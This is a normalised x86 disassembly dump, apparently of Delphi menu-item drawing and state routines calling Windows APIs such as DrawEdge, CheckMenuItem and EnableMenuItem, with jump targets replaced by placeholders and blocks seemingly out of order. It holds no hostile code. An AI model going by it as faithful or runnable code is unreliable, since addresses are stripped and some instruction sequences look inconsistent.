je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424bc0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424bc0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429f0c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424b94
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_460d67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428f08
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4243f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45cdd8
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424bc0
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45fdc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4246c0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425648
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425370
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45d0c8
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425648
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_425178
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4243f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032b0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45fdc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46122b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45ee88
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4254a8
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45fdc4
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_461378
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_461d5c
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4613a8
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4613f4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4615d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4034ac
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4613a8
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_461d5c
mov esi eax
mov eax edi
call sub_461378
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402cc4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404144
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45ee88
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4043b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4615dd
lea eax [ ebp - 0x24 ]
call sub_4040ac
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45fdc4
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_461608
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4044b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404100
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_461630
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4617a0
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_4617b0
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_461678
sub_461678
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45fd34
push eax
call CheckMenuItem
mov eax esi
call sub_461630
sub_4616cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_4617a0
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45fd34
push eax
call EnableMenuItem
sub_461744
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_461b04
mov edx eax
mov ecx ebx
mov eax edi
call sub_45fcd4
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_461630
sub_4617b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4189b0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45eddc
sub_461820
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4617a0
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_461808
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_461b38
mov ecx ebx
mov edx esi
mov eax edi
call sub_46192c
sub_461868
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4617a0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4617b0
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4618c0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_4617a0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4617b0
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_4617b0
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_46192c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45eddc
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45fcd4
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_418a2c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_461ba4
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_4617a0
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45fc04
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4189b0
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4189b0
mov dl [ eax + 0x3f ]
mov eax esi
call sub_461744
sub_4619e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45eddc
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_4617a0
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45fc04
mov eax ebx
call sub_4617a0
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4189b0
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4188a0
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_461a54
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_461678
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_461788
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_461788
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
